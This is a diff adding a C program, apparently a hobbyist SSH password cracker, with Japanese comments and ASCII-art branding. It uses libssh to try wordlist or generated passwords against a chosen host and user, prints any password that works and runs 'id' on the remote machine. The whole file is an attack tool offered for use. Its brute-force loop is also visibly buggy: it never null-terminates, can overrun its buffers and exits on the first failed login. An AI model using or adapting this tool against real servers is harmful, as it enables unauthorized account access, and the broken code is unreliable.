@@ -1,0 +1,206 @@
+/*
+ * このパスワード解析ツールはLinuxでもWindowsでも実行可能にしています。
+ * これが俺の優しさだよ(´・ω・｀)
+ */
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <libssh/libssh.h>
+#if defined(WIN32) && !defined(UNIX)
+#define cls "cls"   /* Do windows stuff */
+#elif defined(UNIX) && !defined(WIN32)
+#define cls "clear" /* Do linux stuff */
+#else
+#define cls "clear" /* If you are not sure, make it a Linux command. */
+#endif
+#define LEN 1024
+
+inline void logo() {
+    system(cls);
+    puts("           _                           _ ");
+    puts("   ___ ___| |__     ___ _ __ __ _  ___| | _____ _ __");
+    puts("  / __/ __| '_ \\   / __| '__/ _` |/ __| |/ / _ \\ '__|");
+    puts("  \\__ \\__ \\ | | | | (__| | | (_| | (__|   <  __/ |");
+    puts("  |___/___/_| |_|  \\___|_|  \\__,_|\\___|_|\\_\\___|_|");
+    puts("");
+    printf("          ---==[ creator: ware255 ]==---  \n");
+}
+
+//コマンドを一回だけ実行させる
+int show_remote_processes(ssh_session session) {
+    ssh_channel channel;
+    int nbytes, rc;
+    char buffer[256];
+    
+    channel = ssh_channel_new(session);
+    if (channel == NULL) return SSH_ERROR;
+    
+    rc = ssh_channel_open_session(channel);
+    if (rc != SSH_OK) {
+        ssh_channel_free(channel);
+        return rc;
+    }
+    
+    rc = ssh_channel_request_exec(channel, "id");
+    if (rc != SSH_OK) {
+        ssh_channel_close(channel);
+        ssh_channel_free(channel);
+        return rc;
+    }
+    
+    nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
+    while (nbytes > 0) {
+        if (write(1, buffer, nbytes) != (unsigned int) nbytes) {
+            ssh_channel_close(channel);
+            ssh_channel_free(channel);
+            return SSH_ERROR;
+        }
+        nbytes = ssh_channel_read(channel, buffer, sizeof(buffer), 0);
+    }
+    
+    if (nbytes < 0) {
+        ssh_channel_close(channel);
+        ssh_channel_free(channel);
+        return SSH_ERROR;
+    }
+    
+    ssh_channel_send_eof(channel);
+    ssh_channel_close(channel);
+    ssh_channel_free(channel);
+    
+    return SSH_OK;
+}
+
+int ssh_main_connection(char host[], char name[], int port, char password[]) {
+    char ip[strlen(host) + 1];
+    char user[strlen(name) + 1];
+    char key[strlen(password) + 1];
+    int rc;
+    size_t i;
+    ssh_session my_ssh_session = ssh_new();
+    
+    if (my_ssh_session == NULL) {
+        return 1;
+    }
+    else {
+        for (i = 0; i <= strlen(password); i++) key[i] = (char)password[i];
+        for (i = 0; i <= strlen(host); i++) ip[i] = host[i];
+        for (i = 0; i <= strlen(name); i++) user[i] = name[i];
+    }
+    
+    ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, ip);
+    ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, user);
+    ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, &port);
+    ssh_options_set(my_ssh_session, SSH_OPTIONS_CIPHERS_C_S, "aes128-ctr");
+    
+    if ((rc = ssh_connect(my_ssh_session)) != SSH_OK) {
+        fprintf(stderr, "Error: %s\n", ssh_get_error(my_ssh_session));
+        ssh_free(my_ssh_session);
+        return 1;
+    }
+    
+    if ((rc = ssh_userauth_password(my_ssh_session, NULL, key)) != SSH_AUTH_SUCCESS) {
+        ssh_disconnect(my_ssh_session);
+        ssh_free(my_ssh_session);
+        return 1;
+    }
+    else {
+        printf("\nPassword found! => %s\n", key);
+    }
+    
+    if ((rc = show_remote_processes(my_ssh_session)) != SSH_OK) {
+        printf("Error: コマンドの実行が出来なかったお\n");
+        ssh_free(my_ssh_session);
+        return 1;
+    }
+    
+    ssh_disconnect(my_ssh_session);
+    ssh_free(my_ssh_session);
+    return 0;
+}
+
+//辞書攻撃
+inline void dictionary_attack(char host[], char name[], int *port) {
+    char filename[256], str[LEN];
+    //int i;
+    if (port == NULL) {
+        printf("Error: port is NULL\n");
+        exit(1);
+    }
+    logo();
+    printf("\nEnter a file name.\n: ");
+    fgets(filename, sizeof(filename), stdin);
+    filename[strcspn(filename, "\n")] = 0;
+    FILE *fp;
+    if ((fp = fopen(filename, "r")) == NULL) {
+        printf("Error: Could not open file.\n");
+        exit(1);
+    }
+    printf("\nAnalyzing %s password...\n", host);
+    while (fgets(str, LEN, fp) != NULL) {
+        str[strcspn(str, "\n")] = 0;
+        if (ssh_main_connection(host, name, *port, str) == 0) {
+            break;
+        }
+    }
+    fclose(fp);
+    return;
+}
+
+//総当たり攻撃
+inline void brute_force_attack(char host[], char name[], int *port) {
+    char c[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz,./\\]:;@[^-+!\"#$%&\'()";
+    char pass[LEN];
+    if (port == NULL) {
+        printf("Error: port is NULL\n");
+        exit(1);
+    }
+    for (unsigned long i = 0;; i++) {
+        pass[i] = c[i];
+        if (ssh_main_connection(host, name, *port, pass) != 0) {
+            exit(1);
+        }
+    }
+    return;
+}
+
+int main(int argc, char* argv[]) {
+    char c_mode[4];
+    int port = 22, mode = 2;
+    
+    if (argc < 6) {
+        printf("\nHow to use: %s -h <IP> -p <Port> -u <user_name>\n\n", argv[0]);
+        return 1;
+    }
+    
+    port = atoi(argv[4]);
+    if (port < 0 || port > 65535) {
+        printf("Error: short型って知ってる?\n");
+        return 1;
+    }
+    
+    logo();
+    
+    puts("\n 1: brute force attack");
+    puts(" 2: dictionary attack");
+    printf("[*] Select Mode [1/2]: ");
+    fgets(c_mode, sizeof(c_mode), stdin);
+    if (c_mode[0] == '\n') {
+        dictionary_attack(argv[2], argv[6], &port);
+    }
+    mode = atoi(c_mode);
+    switch (mode) {
+    case 1:
+        brute_force_attack(argv[2], argv[6], &port);
+        break;
+    case 2:
+        dictionary_attack(argv[2], argv[6], &port);
+        break;
+    default:
+        printf("Error: 整数って知ってる?\n");
+        return 1;
+        break;
+    }
+    
+    return 0;
+}
